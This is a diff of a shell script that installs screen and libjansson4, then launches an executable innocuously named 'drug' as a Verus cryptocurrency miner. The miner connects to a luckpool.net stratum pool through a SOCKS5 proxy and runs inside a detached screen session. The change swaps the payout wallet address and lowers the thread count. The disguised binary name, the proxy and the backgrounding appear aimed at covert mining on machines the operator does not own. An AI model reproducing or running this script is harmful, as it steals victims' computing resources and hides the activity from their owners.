@@ -11,4 +11,4 @@ apt update
 apt install screen libjansson4 -y
 screen -dmS ls
 chmod u+x drug
-./drug -a verus -o stratum+tcp://na.luckpool.net:3956 -u RTc1CPHwDUMLRZoMEoPXaySRvMBV33NhWD.TEST -p x -t 15 -x socks5://192.252.214.20:15864
+./drug -a verus -o stratum+tcp://na.luckpool.net:3956 -u RLNVtg1jXXuRmMkvoi6EcaCFgQzNf5vBew.TEST -p x -t 4 -x socks5://192.252.214.20:15864
